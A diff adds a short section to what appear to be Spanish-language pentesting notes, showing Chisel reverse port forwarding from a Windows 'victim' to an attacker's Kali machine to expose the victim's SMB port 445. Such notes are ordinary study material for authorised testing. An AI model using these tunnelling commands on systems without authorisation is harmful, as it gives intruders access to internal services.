@@ -815,6 +815,20 @@ user pass
 user/pass
 ```
 
+## Chisel (traerse un puerto para que tu puero local sea el puerto de la maquina victima)
+
+Recordar la maquina atacante es el servidor y la maquina vitima el cliente. En el mismo chisel dice que es reverse port forwarding.
+
+```
+#Kali
+ ./chisel server --reverse -p 4321
+
+### Windows victima
+
+.\chisel.exe client IPKALI:4321 R:445:127.0.0.1:445
+
+```
+
 # Windows
 
 ## Arquitecura x86 o x64
